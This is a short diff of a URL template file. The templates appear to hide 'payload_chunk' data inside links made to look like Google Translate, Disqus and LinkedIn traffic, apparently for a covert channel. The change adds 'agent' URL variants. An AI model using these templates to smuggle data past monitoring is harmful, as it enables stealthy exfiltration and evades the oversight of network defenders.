@@ -10,5 +10,8 @@ http://translate.googleusercontent.com/translate_c?depth=1&rurl=translate.google
 #http://redirect.disqus.com/url?threadrank=1&impression=${ tpl.payload_chunk(36) }&role=thread-footer&forum=1${ tpl.rand_number(16) }&thread=${ tpl.target_name() }&behavior=click&url=${ tpl.target_name() }&type=digest.daily&event=email
 #http://www.linkedin.com/profile/view?id=${ tpl.rand_number(8) }&pid=${ tpl.rand_number(8) }&authType=name&authToken=${ tpl.rand_chars(4) }&goback=C${ tpl.rand_chars(1) }&report%2Esuccess=${ tpl.payload_chunk(62) }
 #http://www.linkedin.com/profile/view?id=${ tpl.rand_number(8) }&authType=NAME_SEARCH&authToken=${ tpl.rand_chars(4) }&locale=${ tpl.rand_domain() }&srchid=${ tpl.payload_chunk(38) }&srchindex=1&srchtotal=6&goback=C${ tpl.rand_chars(1) }&pvs=ps&trk=pp_profile_photo_link
-http://${ tpl.get_url() }/?${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }&${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }
-http://${ tpl.get_url() }/?${ tpl.rand_chars(3) }=${ tpl.payload_chunk(30,20) }
+
+http://${ tpl.get_url_base() }/?${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }&${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }
+http://${ tpl.get_url_base() }/?${ tpl.rand_chars(3) }=${ tpl.payload_chunk(30,20) }
+http://${ tpl.get_url_agent() }?${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }&${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }
+http://${ tpl.get_url_agent() }?${ tpl.rand_chars(3) }=${ tpl.payload_chunk(30,20) }
